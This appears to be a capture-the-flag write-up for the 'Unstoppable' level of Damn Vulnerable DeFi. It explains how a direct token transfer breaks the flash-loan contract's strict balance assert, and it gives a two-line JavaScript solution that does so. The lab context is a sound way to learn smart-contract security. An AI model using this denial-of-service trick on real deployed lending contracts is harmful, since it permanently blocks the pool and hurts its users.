## GOAL
Break the contract

## Examning The Code
Look at the ```flashLoan``` function in UnstoppableLender.sol:
```solidity
 function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);
        
        damnValuableToken.transfer(msg.sender, borrowAmount);
        
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```
1. First checking the borrowAmount is greater than 0.
2. Then checking if the amount we want to borrow is more than the balance.
3. It ensures that the poolBalance == balanceBefore (the balance of the contracts)
4. Then it transfer to the user.

As we can see the assert is ensuring the poolBalance == the balance of the address. 
The only place were the poolBalance is updated is in deposit function.
So how we can break it ;)

## Exploiting 
What about transfering directly to the contract? So the contract balance will increase however the poolBalance will be the same,and the ```assert(poolBalance == balanceBefore);``` will always fail.

## Solution
```javascript
const attackTokenContract = this.token.connect(attacker);
await attackTokenContract.transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE,);
```